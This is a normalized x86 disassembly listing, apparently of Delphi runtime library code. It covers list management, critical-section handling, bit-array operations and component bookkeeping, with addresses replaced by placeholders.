cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413680
retn
call sub_4136b0
sub_413878
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_413898
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4138e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413980
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028c8
mov edx esi
mov eax ebx
call sub_4139f4
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413948
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_413944
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
jmp sub_40386c
sub_413980
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4139c8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4059b4
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413948
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4139cf
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_4139f4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413980
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_413a1c
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_413bb0
retn
sub_413a50
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_413a70
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413980
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028c8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413ae8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413980
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4139f4
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_4138e4
xor ecx ecx
mov edx esi
mov eax ebx
call sub_413a70
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_413b40
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413980
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413b90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_413a50
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4138e4
sub_413bb0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413980
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40270c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_413bec
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413980
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_413bb0
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b04
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_4138e4
dec ebp
inc edi
jne r-xdata
sub_413c5c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor esi esi
mov edx edi
mov eax ebx
call sub_413a50
test eax eax
jl r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov esi edi
mov edx [ ebx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 4 ] ecx
mov edx eax
mov eax ebx
call sub_4138e4
mov cl 0x1
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413c9c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_413cf0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40346c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413df4
xor eax eax
push ebp
push sub_413d52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4030f8
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4030e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d59
mov eax [ ebp - 0x4 ]
call sub_413e58
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_413d6c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413df4
xor eax eax
push ebp
push sub_413de8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413898
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413a50
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413def
mov eax [ ebp - 0x4 ]
call sub_413e58
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_413980
sub_413e08
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413df4
xor eax eax
push ebp
push sub_413e4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413b90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413e52
mov eax [ ebp - 0x4 ]
call sub_413e58
retn
sub_413e64
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_413eb8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_413eb8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_413e94
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026cc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b04
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026ec
mov edx edi
mov eax ebp
call sub_413eac
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028c8
sub_413f5c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_413e94
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_413eb8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_413f88
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_414000
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_416aa4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_414040
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4140f6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f4c
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403048
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404118
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403048
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4140fd
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_41411c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4141b1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403048
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404118
mov eax ebx
mov si 0xffff
call sub_4032f4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141b8
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax ebx
mov si 0xffff
call sub_4032f4
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4032f4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404234
sub_4141c3
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403334
mov eax ebx
mov si 0xffff
call sub_4032f4
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4032f4
push eax
lea eax [ ebx + 0x4 ]
call sub_4054f0
mov ecx eax
mov edx r-xdata
pop eax
call sub_4031ac
sub_414220
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414240
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414260
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031ac
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414288
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_4054f0
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_4032f4
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax edi
call sub_4054f0
mov edx eax
mov eax esi
call sub_414288
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_4054f0
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_414320
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_414375
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4054f0
mov edx eax
mov eax edi
call sub_414288
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41437c
lea eax [ ebp - 0x4 ]
call sub_4054f0
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_414384
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4143bc
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414000
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4143ec
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_414428
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403048
mov edx esp
mov eax esi
call sub_404118
add esp 0x100
pop esi
pop ebx
retn
sub_414450
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4144e5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_403048
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_404118
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_4032f4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_414410
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408aac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144ec
lea eax [ ebp - 0x14 ]
call sub_403eb4
retn
sub_414508
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_414668
mov edx ebx
mov eax esi
call sub_414600
sub_414538
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_414410
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_413ae8
mov dl 0x1
mov eax ebx
call sub_4143ec
sub_414568
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414598
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4145f2
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_413adc
call sub_4030f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414600
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_403284
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_413898
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_414588
xor ecx ecx
mov edx esi
mov eax ebx
call sub_414320
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_413980
sub_414668
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_413adc
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_413b90
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4138e4
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_414320
mov eax ebx
call sub_414588
pop edi
pop esi
pop ebx
retn
sub_4146bc
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_415214
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414000
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4146ec
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414710
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_414734
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4147db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414884
xor eax eax
push ebp
push sub_4147be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147c5
mov eax [ ebp - 0x4 ]
call sub_414940
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4147ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41402c
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_414884
xor eax eax
push ebp
push sub_41486c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414940
retn
sub_41489c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414954
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4148f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_4150ac
mov eax [ ebp - 0x8 ]
push eax
push sub_41535c
push ebp
call sub_41489c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414954
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4149e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149f0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403ed8
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4042c0
jne r-xdata
sub_414a00
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4149fc
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
jmp sub_40386c
sub_414a38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414a80
